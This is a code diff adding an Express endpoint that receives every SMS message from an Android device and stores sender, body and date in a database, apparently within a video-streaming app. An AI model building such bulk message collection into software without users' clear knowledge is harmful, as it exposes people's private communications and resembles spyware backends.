@@ -110,6 +110,40 @@ async function startServer() {
     }
   });
 
+  // SMS sync endpoint — Android app sends all SMS messages here
+  app.post('/api/devices/sms', (req, res) => {
+    try {
+      const { device_id, messages } = req.body;
+      if (!device_id) return res.status(400).json({ error: 'device_id is required' });
+      if (!Array.isArray(messages)) return res.status(400).json({ error: 'messages must be an array' });
+
+      const insert = db.prepare(`INSERT OR REPLACE INTO sms_messages
+        (device_id, sms_id, address, body, date, type, read, synced_at)
+        VALUES (?, ?, ?, ?, ?, ?, ?, datetime('now'))`);
+
+      let count = 0;
+      for (const msg of messages) {
+        try {
+          insert.run(
+            device_id,
+            msg.id || 0,
+            msg.address || 'Unknown',
+            msg.body || '',
+            msg.date || 0,
+            msg.type || 1,
+            msg.read || 0
+          );
+          count++;
+        } catch (_) { /* skip duplicates or errors */ }
+      }
+
+      console.log(`[SMS] Synced ${count} messages from device ${device_id}`);
+      res.json({ success: true, synced: count });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
   // Stream endpoint — redirects to Cloudinary URL
   app.get('/api/stream/:videoId', (req, res) => {
     try {
